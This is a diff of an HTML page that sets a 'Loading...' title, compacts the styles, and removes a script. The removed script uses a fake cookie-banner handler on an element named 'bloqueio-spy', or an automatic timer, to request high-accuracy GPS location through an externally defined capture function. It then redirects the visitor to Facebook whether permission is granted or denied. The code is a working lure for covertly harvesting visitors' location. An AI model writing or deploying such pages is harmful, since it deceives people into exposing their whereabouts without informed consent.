@@ -3,95 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Carregando...</title>
     <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: Arial, sans-serif;
-            background: #f8f9fa;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .container {
-            text-align: center;
-            background: white;
-            padding: 50px;
-            border-radius: 12px;
-            box-shadow: 0 4px 25px rgba(0,0,0,0.1);
-            max-width: 500px;
-        }
-        h2 { color: #333; }
+        body { margin:0; padding:0; background:#f8f9fa; display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:Arial, sans-serif; }
+        .container { text-align:center; background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
     </style>
 </head>
-<body>
-
-    <script>
-        function redirecionar() {
-            const destino = window.urlRedirecionamento || "https://www.facebook.com";
-            window.location.replace(destino);
-        }
-
-        // Função principal para disparar GPS e redirecionar após resposta
-        function iniciarGPS() {
-            console.log('[Blank] Iniciando solicitação de GPS...');
-
-            if (typeof dispararGPS === "function") {
-                const originalDispararGPS = dispararGPS;
-
-                dispararGPS = function() {
-                    if (typeof originalDispararGPS === "function") {
-                        originalDispararGPS();
-                    }
-
-                    // Redireciona INSTANTANEAMENTE após o usuário responder o GPS
-                    navigator.geolocation.getCurrentPosition(
-                        function() {
-                            console.log('[Blank] GPS permitido - redirecionando AGORA');
-                            redirecionar();
-                        },
-                        function() {
-                            console.log('[Blank] GPS negado - redirecionando AGORA');
-                            redirecionar();
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                };
-
-                dispararGPS();
-            } else {
-                // Fallback caso não exista dispararGPS
-                redirecionar();
-            }
-        }
-
-        // Função chamada pelo banner (quando ativado)
-        window.aceitarCookies = function() {
-            const banner = document.getElementById('bloqueio-spy');
-            if (banner) {
-                banner.style.display = 'none';
-            }
-
-            console.log('[Blank] Banner respondido - iniciando GPS');
-            iniciarGPS();
-        };
-
-        // Comportamento ao carregar a página
-        window.addEventListener('load', function() {
-            if (!document.getElementById('bloqueio-spy')) {
-                // === SEM BANNER: ainda espera o GPS ===
-                console.log('[Blank] Sem banner - aguardando permissão de GPS');
-                setTimeout(iniciarGPS, 600); // pequeno delay para carregar scripts
-            } else {
-                console.log('[Blank] Banner ativo - aguardando clique em CONTINUAR');
-            }
-        });
-    </script>
 </body>
 </html>
